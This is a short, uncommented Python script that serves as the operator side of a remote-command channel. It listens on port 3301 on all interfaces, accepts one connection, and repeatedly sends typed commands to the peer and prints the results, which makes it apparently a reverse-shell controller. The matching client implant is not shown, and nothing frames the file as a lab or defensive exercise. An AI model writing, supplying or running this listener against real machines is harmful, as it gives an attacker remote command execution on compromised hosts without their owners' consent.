import socket
import threading

HOST='0.0.0.0'
PORT=3301

def main():
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        s.bind((HOST,PORT))
        s.listen()
        print('Listening .....')

        conn,addr=s.accept()
        with conn:
            print(f'connected by {addr}')

            while True:
                command=input('Enter command:')
                command=command.encode()
                conn.send(command)
                output=conn.recv(1024)
                output=output.decode()
                print(f'Output:{output}')

if __name__=='__main__':
    main()
